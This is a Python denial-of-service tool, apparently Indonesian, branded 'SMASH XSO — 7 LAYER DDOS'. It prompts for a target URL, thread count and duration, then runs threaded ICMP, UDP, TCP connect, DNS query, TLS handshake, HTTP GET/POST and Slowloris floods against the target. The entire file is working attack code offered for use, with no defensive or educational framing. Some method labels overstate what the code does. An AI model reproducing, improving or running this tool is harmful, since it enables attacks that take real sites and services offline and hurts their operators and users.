#!/usr/bin/env python3
import socket
import threading
import requests
import random
import time
import sys
import os
from urllib.parse import urlparse

# ========== WARNA ANSI ==========
G = "\033[92m"
W = "\033[97m"
R = "\033[91m"
C = "\033[96m"
Y = "\033[93m"
N = "\033[0m"

# ========== CLEAR SCREEN ==========
os.system('clear' if os.name == 'posix' else 'cls')

# ========== BANNER HIJAU (SMASH XSO) ==========
banner = f"""
{G}
   ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗
   ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║
   ███████╗██╔████╔██║███████║███████╗███████║
   ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║
   ███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║
   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

         ☠️  SMASH XSO — 7 LAYER DDOS  ☠️
{N}
"""

print(banner)

# ========== INPUT DARI USER ==========
TARGET_URL = input(f"{C}🔗 Masukkan link target: {N}").strip()
THREAD_COUNT = int(input(f"{C}🧵 Jumlah thread (500-5000): {N}") or 2000)
DURATION = int(input(f"{C}⏱️ Durasi serangan (0 = unlimited): {N}") or 0)

# ========== MENU METODE SERANGAN ==========
print(f"\n{Y}Pilih metode serangan:{N}")
print(f"{C}[1] ICMP Flood (Layer 3){N}")
print(f"{C}[2] UDP Flood (Layer 4){N}")
print(f"{C}[3] TCP SYN Flood (Layer 4){N}")
print(f"{C}[4] DNS Amplification (Layer 5){N}")
print(f"{C}[5] SSL Renegotiation (Layer 6){N}")
print(f"{C}[6] HTTP Flood (Layer 7){N}")
print(f"{C}[7] HTTP POST Flood (Layer 7){N}")
print(f"{C}[8] Slowloris (Layer 7){N}")
print(f"{C}[9] ALL METHODS (Acak){N}")
method_choice = input(f"{C}Pilih nomor (1-9): {N}").strip()

# ========== PARSING TARGET ==========
parsed = urlparse(TARGET_URL)
host = parsed.hostname
port = parsed.port or (443 if parsed.scheme == "https" else 80)
path = parsed.path or "/"

try:
    ip = socket.gethostbyname(host)
except:
    ip = host

print(f"\n{G}="*60)
print(f"{R}☠️ SMASH XSO — 7 LAYER DDOS ULTIMATE ☠️{N}")
print(f"{G}="*60)
print(f"{G}Target : {W}{TARGET_URL}{N}")
print(f"{G}IP     : {W}{ip}:{port}{N}")
print(f"{G}Thread : {W}{THREAD_COUNT}{N}")
print(f"{G}Durasi : {W}{'Unlimited' if DURATION == 0 else f'{DURATION} detik'}{N}")
print(f"{G}="*60 + f"{N}\n")

# ========== FLAG STOP ==========
stop_attack = False

# ========== LAYER 3: ICMP FLOOD ==========
def icmp_flood():
    global stop_attack
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while not stop_attack:
            packet = b"\x08\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + random._urandom(56)
            s.sendto(packet, (ip, 0))
    except:
        pass

# ========== LAYER 4: UDP FLOOD ==========
def udp_flood():
    global stop_attack
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_attack:
        try:
            payload = random._urandom(65500)
            s.sendto(payload, (ip, port))
        except:
            pass

# ========== LAYER 4: TCP SYN FLOOD ==========
def tcp_flood():
    global stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ip, port))
            s.send(b"GET " + path.encode() + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

# ========== LAYER 5: DNS AMPLIFICATION ==========
def dns_amp():
    global stop_attack
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_attack:
        try:
            dns = random.choice(dns_servers)
            query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
            s.sendto(query, (dns, 53))
            s.sendto(query, (ip, 53))
        except:
            pass

# ========== LAYER 6: SSL RENEGOTIATION ==========
def ssl_flood():
    global stop_attack
    try:
        import ssl
        context = ssl.create_default_context()
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                ssl_sock = context.wrap_socket(sock, server_hostname=host)
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                ssl_sock.close()
            except:
                pass
    except:
        pass

# ========== LAYER 7: HTTP FLOOD ==========
def http_flood():
    global stop_attack
    session = requests.Session()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        ]),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Referer": "https://google.com",
    }
    while not stop_attack:
        try:
            rand_param = random.randint(1, 999999)
            session.get(f"{TARGET_URL}?id={rand_param}", headers=headers, timeout=2)
        except:
            pass

# ========== LAYER 7: SLOWLORIS ==========
def slowloris():
    global stop_attack
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(b"Host: " + host.encode() + b"\r\n")
        s.send(b"User-Agent: Mozilla/5.0\r\n")
        while not stop_attack:
            s.send(b"X-Header: " + str(random.randint(1, 9999)).encode() + b"\r\n")
            time.sleep(random.uniform(0.5, 3))
    except:
        pass

# ========== LAYER 7: HTTP POST FLOOD ==========
def http_post_flood():
    global stop_attack
    headers = {"User-Agent": "Mozilla/5.0"}
    while not stop_attack:
        try:
            data = {"random": random.randint(1, 999999), "data": random._urandom(100).hex()}
            requests.post(TARGET_URL, data=data, headers=headers, timeout=2)
        except:
            pass

# ========== DAFTAR METODE ==========
all_methods = {
    "1": icmp_flood,
    "2": udp_flood,
    "3": tcp_flood,
    "4": dns_amp,
    "5": ssl_flood,
    "6": http_flood,
    "7": http_post_flood,
    "8": slowloris,
}

# Pilih metode berdasarkan input user
if method_choice == "9":
    selected_methods = list(all_methods.values())
    print(f"{G}[+] Menggunakan SEMUA metode (acak){N}")
else:
    if method_choice in all_methods:
        selected_methods = [all_methods[method_choice]]
        print(f"{G}[+] Menggunakan metode: {method_choice}{N}")
    else:
        print(f"{R}[!] Pilihan tidak valid, menggunakan semua metode.{N}")
        selected_methods = list(all_methods.values())

# Tambahkan ICMP hanya jika root dan metode dipilih (jika user pilih 1 atau 9)
if os.geteuid() != 0:
    if method_choice == "1" or method_choice == "9":
        print(f"{Y}[!] ICMP Flood membutuhkan root, lewati.{N}")
        if method_choice == "1":
            print(f"{Y}[!] Ganti ke UDP Flood sebagai gantinya.{N}")
            selected_methods = [udp_flood]

# ========== THREADING ==========
threads = []
for i in range(THREAD_COUNT):
    attack_func = random.choice(selected_methods)
    t = threading.Thread(target=attack_func)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"{G}[+] SMASH XSO — Serangan dimulai! {N}")
print(f"{C}Ketik {R}stop{N}{C} untuk menghentikan serangan.{N}\n")

# ========== LISTENER STOP ==========
def stop_listener():
    global stop_attack
    while True:
        cmd = input().strip().lower()
        if cmd == "stop":
            stop_attack = True
            print(f"\n{R}🛑 Perintah stop diterima. Menghentikan serangan...{N}")
            break

listener_thread = threading.Thread(target=stop_listener)
listener_thread.daemon = True
listener_thread.start()

# ========== DURASI & MONITOR ==========
if DURATION > 0:
    time.sleep(DURATION)
    stop_attack = True
    print(f"\n{R}🛑 Serangan selesai setelah {DURATION} detik.{N}")
    sys.exit()

try:
    while not stop_attack:
        time.sleep(5)
        print(f"{C}[+] SMASH XSO — Thread aktif: {threading.active_count()} | Target: {host}{N}")
except KeyboardInterrupt:
    stop_attack = True
    print(f"\n{R}🛑 SMASH XSO — Serangan dihentikan.{N}")
    sys.exit()
